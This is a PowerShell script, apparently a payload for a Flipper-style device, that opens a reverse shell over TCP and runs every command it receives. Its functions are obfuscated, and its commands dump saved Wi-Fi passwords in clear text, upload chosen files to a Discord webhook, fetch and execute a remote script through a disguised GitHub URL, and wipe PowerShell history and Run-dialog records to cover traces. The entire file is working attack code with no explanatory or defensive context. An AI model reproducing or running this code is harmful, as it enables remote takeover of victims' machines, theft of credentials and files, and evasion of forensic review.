$3aa2ad906c2b4439a6dee0a389abb6ae = New-Object Net.Sockets.TCPClient($ip, $p)
$32c6fa2cbe4e4467b2496ec6170445a0 = $3aa2ad906c2b4439a6dee0a389abb6ae.GetStream()
$40762deaed16419582a9e2fa022f34cb = New-Object IO.StreamWriter($32c6fa2cbe4e4467b2496ec6170445a0)

function hasbullawjwindbw {
    (iwr 'https://google.com@raw.githubusercontent.com/CharlesTheGreat77/token2Discord/main/Testing.txt').Content | iex
}

function popopwhwhbsvxjnfiifb {
    $PsandQs = netsh wlan export profile key=clear; 
    Select-String -Path *.xml -Pattern 'keyMaterial' | 
    % { $_ -replace '</?keyMaterial>', ''} | 
    % { $_ -replace '.xml:22:', '' }
    wuwudhbdbwb("OUTPUT: $PsandQs")
}

function flipejsjiebsbllb($ibwjskwbnskieg) {
    $faylownabbdjw = @{
        content = $ibwjskwbnskieg
    } | ConvertTo-Json

    $espoenabjsmbe = Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $faylownabbdjw
}

function kwhhabzbabjeikfn {
    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
    Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -ErrorAction SilentlyContinue
}

function wuwudhbdbwb($String) {
    [byte[]]$cc63f96fb8d24ff993ecd4f81ea1715c=0..$3aa2ad906c2b4439a6dee0a389abb6ae.ReceiveBufferSize|ForEach-Object{0}
    $40762deaed16419582a9e2fa022f34cb.Write($String+'ffff> ')
    $40762deaed16419582a9e2fa022f34cb.Flush()
}

wuwudhbdbwb('')

$0abddb0134484e0ca2c951ce3e99f16c=1
$cc63f96fb8d24ff993ecd4f81ea1715c=New-Object byte[] $3aa2ad906c2b4439a6dee0a389abb6ae.ReceiveBufferSize

while ($0abddb0134484e0ca2c951ce3e99f16c -ge 0) {
    $0abddb0134484e0ca2c951ce3e99f16c = $32c6fa2cbe4e4467b2496ec6170445a0.Read($cc63f96fb8d24ff993ecd4f81ea1715c, 0, $cc63f96fb8d24ff993ecd4f81ea1715c.Length)
    
    if ($0abddb0134484e0ca2c951ce3e99f16c -gt 0) {
        $72b24f293ec941fabe2c084e41efcf4b = [System.Text.Encoding]::UTF8.GetString($cc63f96fb8d24ff993ecd4f81ea1715c, 0, $0abddb0134484e0ca2c951ce3e99f16c - 1)

        # Trim input to remove whitespace/newlines
        $72b24f293ec941fabe2c084e41efcf4b = $72b24f293ec941fabe2c084e41efcf4b.Trim()

        if ($72b24f293ec941fabe2c084e41efcf4b -match "^/discord\s+(.+)$") {
            $filename = $matches[1]
            $ibwjskwbnskieg = "Flipper Report for $env:USERNAME"
            flipejsjiebsbllb($ibwjskwbnskieg)
            curl.exe -F "file1=@$filename" $webhook
            $bdubsiwiwnbdvank = "File '$filename' sent.."
            wuwudhbdbwb($bdubsiwiwnbdvank)
        }
        elseif ($72b24f293ec941fabe2c084e41efcf4b -match "^/tgrizzly$") {
            $bdubsiwiwnbdvank = "Executing /tgrizzly functionality.. saving output to C:\temp\output.txt"
            wuwudhbdbwb($bdubsiwiwnbdvank)
            hasbullawjwindbw
        }
        elseif ($72b24f293ec941fabe2c084e41efcf4b -match "^/wifi$") {
            $bdubsiwiwnbdvank = "Executing /wifi.."
            wuwudhbdbwb($bdubsiwiwnbdvank)
            popopwhwhbsvxjnfiifb
        }
        elseif ($72b24f293ec941fabe2c084e41efcf4b -match "^/clean$") {
            $bdubsiwiwnbdvank = "Executing cleanup.."
            wuwudhbdbwb($bdubsiwiwnbdvank)
            kwhhabzbabjeikfn
        }
        elseif ($72b24f293ec941fabe2c084e41efcf4b -match "^/powershell\s+(.+)$") {
            $psCommand = $matches[1]
            $output = try {
                Invoke-Expression $psCommand 2>&1 | Out-String
            } catch {
                $_ | Out-String
            }
            wuwudhbdbwb($output)
        }
        else {
            $214a6b4cb6e043ab909aa13348235114 = try {
                Invoke-Expression $72b24f293ec941fabe2c084e41efcf4b 2>&1 | Out-String
            } catch {
                $_ | Out-String
            }
            wuwudhbdbwb($214a6b4cb6e043ab909aa13348235114)
        }
    }
}

$40762deaed16419582a9e2fa022f34cb.Close()
$3aa2ad906c2b4439a6dee0a389abb6ae.Close()
